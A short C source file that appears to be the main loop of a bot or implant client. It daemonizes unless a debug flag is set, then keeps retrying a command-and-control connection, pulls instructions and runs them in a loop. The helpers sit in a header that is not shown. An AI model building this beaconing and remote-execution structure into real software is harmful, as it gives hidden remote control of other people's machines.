/*
*	some_main.c
*
*/

#include "../include/some_hds.h"

char * getinst;
int sleeptime;
char * instruction;
int main(int argc, char **argv){

	//gloable vars
	sleeptime=100;
	//socket
	sock_t *sp;

	if(strncmp(debug, "yes", strlen(debug))){
		daemonize();
		printf("hi");
	}
	sp = (sock_t *) malloc(sizeof(sock_t));
	while(connect_cc(sp)){
		puts("unable to connect");
		free(sp);
		sp = (sock_t *) malloc(sizeof(sock_t));
	}
	
	char * gg;
	while(gg=instruct(sp)){
		//parse the instructions here
		dothings(instruction);
		free(instruction);
		sleep(sleeptime);
/*
		FILE *fp;
		char *line = NULL;
		size_t len = 0;
		ssize_t read;
	        fp = fopen("sample_file.txt", "r");
		while((read = getline(&line, &len, fp)) != -1){
			printf("%zu \n", read);
			printf("%s \n", line);
		}

		fclose(fp);
		if(line){
			free(line);
		}
*/
		//system("echo hi | wall");

	}	

	return EXIT_SUCCESS;
}
